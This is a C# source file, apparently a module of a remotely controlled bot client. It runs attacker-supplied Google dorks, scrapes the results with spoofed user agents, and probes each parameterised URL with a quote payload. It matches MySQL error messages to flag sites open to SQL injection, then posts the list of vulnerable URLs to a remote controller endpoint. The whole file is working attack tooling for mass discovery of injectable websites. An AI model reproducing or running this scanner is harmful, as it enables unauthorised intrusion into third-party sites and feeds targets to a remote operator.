using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Web;

namespace ClIENT_PC.Controller
{
    class ServicesController : ControllerBase
    {
        public ServicesController(string[] objet)
        {
            if (Parametre.Service_google)
            {
                Thread thread = new Thread(() => Controlleur(objet));
                thread.Priority = ThreadPriority.Normal;
                thread.Start();
            }
        }
        private static Hashtable hashtable = new Hashtable();
        private static List<string> Urls = new List<string> { };
        private static List<string> Dork = new List<string> { };
        private static int tentativeMax = 5;
        private static int pageMax = 300;
        private static int pageMin = 40;

        private static void Controlleur(string[] objet)
        {
            Thread.Sleep(5015);

            string pMaxBrut = objet[2];
            string pMinBrut = objet[3];
            string[] dork = Regex.Split(objet[4], "\r\n");
            
            if (dork.Length > 0)
            {
                pageMax = (pMaxBrut != string.Empty) ? Convert.ToInt32(pMaxBrut) : pageMax;
                pageMin = (pMinBrut != string.Empty) ? Convert.ToInt32(pMinBrut) : pageMin;
                
                Thread th = new Thread(() => Google(dork));
                th.Start();
                th.Join();
                if(Urls.Count > 0)
                {
                    EnvoyerDonne();
                }
            }
        }

        private static bool EnvoyerDonne()
        {
            HttpRequester hr = new HttpRequester();
            string donne = string.Join("\r\n", Urls.ToArray());

            string u = Router.url("send_service");
            string p = "reponse=" + donne;

            using (WebClient wc = new WebClient())
            {
                wc.Headers[HttpRequestHeader.ContentType] = "application/x-www-form-urlencoded";
                string rep = wc.UploadString(u, p);
                if (rep.Contains("ok"))
                {
                    return true;
                }
                else
                {
                    return false;
                }
            }
        }
        public static void Google(string[] DorkArray)
        {
            int compteur;
            int nbrdork = DorkArray.Length;
            for (int i = 0; i < nbrdork; i++)
            {
                for (compteur = pageMax; compteur > pageMin; compteur -= 10)
                {
                    string url = "https://www.google.com/search?q=" + HttpUtility.UrlEncode(DorkArray[i]) + "&start=" + compteur + "&filter=0";
                    string page = get(url);
                    if ((!page.Contains("CAPTCHA")))
                    {
                        Extraire(page);
                    }
                    else
                    {
                        break;
                    }
                }
            }
        }
        private static void Extraire(string page)
        {
            Match regex = Regex.Match(page, "(?<=\"r\"><. href=\")(.+?)\"", RegexOptions.IgnoreCase);
            while (regex.Success)
            {
                string url = Uri.UnescapeDataString(regex.Groups[1].Value);
                Match trouver = Regex.Match(url, @"\/url\?q\=(.*?)\&amp\;", RegexOptions.IgnoreCase);
                if (trouver.Success)
                {
                    url = HttpUtility.HtmlDecode(HttpUtility.UrlDecode(trouver.Groups[1].Value));
                    if (Verfier(url))
                    {
                        url = HttpUtility.UrlEncode(url);
                        hashtable.Add(nomdomaine(url), url);
                        Urls.Add(url);
                    }
                }
                regex = regex.NextMatch();
            }
        }
        private static bool VerfierVulne(string url)
        {
            string page = get(url += "'A=0");
            if (Regex.IsMatch(page, @"error in your SQL syntax|mysql_fetch_array\(\)|execute query|mysql_fetch_object\(\)|mysql_num_rows\(\)|mysql_fetch_assoc\(\)|mysql_fetc​h\?\?_row\(\)|SELECT \* FROM|supplied argument is not a valid MySQL|Syntax error|Fatal error", RegexOptions.IgnoreCase))
            {
                return true;
            }
            else
            {
                return false;
            }
        }
        private static bool Verfier(string url)
        {
            if ((url.Contains('?')) && (url.Contains('=')) && (Bon(url)) && (url.StartsWith("http")) && (!hashtable.Contains(nomdomaine(url))))
            {
                if (VerfierVulne(url))
                {
                    return true;
                }
                else 
                {
                    return false; 
                }
            }
            else { return false; }
        }

        private static string get(string url_)
        {
            Uri url = new Uri(url_);
            var reponse = "";

            for (int i = 0; i < tentativeMax; i++)
            {
                try
                {
                    HttpWebRequest req = (HttpWebRequest)HttpWebRequest.Create(url);
                    req.Accept = "*/*";
                    req.Timeout = 60000;
                    req.UserAgent = useragent();
                    req.AllowAutoRedirect = true;
                    req.Method = WebRequestMethods.Http.Get;
                    HttpWebResponse rep = (HttpWebResponse)req.GetResponse();
                    StreamReader sr = new StreamReader(rep.GetResponseStream());
                    reponse = WebUtility.HtmlDecode(sr.ReadToEnd().ToString());
                    break;
                }
                catch
                { }
                i++;
            }
            return reponse;
        }
        private static string useragent()
        {
            string[] ua = 
            {
                "Mozilla/5.0 (X11; Linux i686) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.52 Safari/536.5",
                "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1.11) Gecko/20071127 Firefox/2.0.0.11",
                "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
                "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.5 (like Gecko) (Kubuntu)",
                "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.12) Gecko/20070731 Ubuntu/dapper-security Firefox/1.5.0.12",
                "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.102011-10-16 20:23:50",
                "Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en) AppleWebKit/534.1+ (KHTML, like Gecko) Version/6.0.0.337 Mobile Safari/534.1+2011-10-16 20:21:10",
                "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.0",
                "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6"
            };
            Random r = new Random();
            int i = r.Next(0, ua.Length - 1);
            return ua[i];
        }
        static List<string> BlackListe = new List<string> 
        {
            "facebook",
            "youtube",
            "msn",
            "ebay",
            "google",
            "pastebin",
            "yahoo",
            "sourceforge",
            "microsoft",
            "yandex.com",
            "github.com"
        };
        private static bool Bon(string url)
        {
            bool oui = true;
            foreach (string mot in BlackListe)
            {
                if (url.Contains(mot))
                {
                    oui = false;
                    break;
                }
            }
            return oui;
        }
        private static string nomdomaine(string url)
        {
            string[] morceaux = url.Split('/');
            return morceaux[2].Split('/')[0];
        }

    }
}
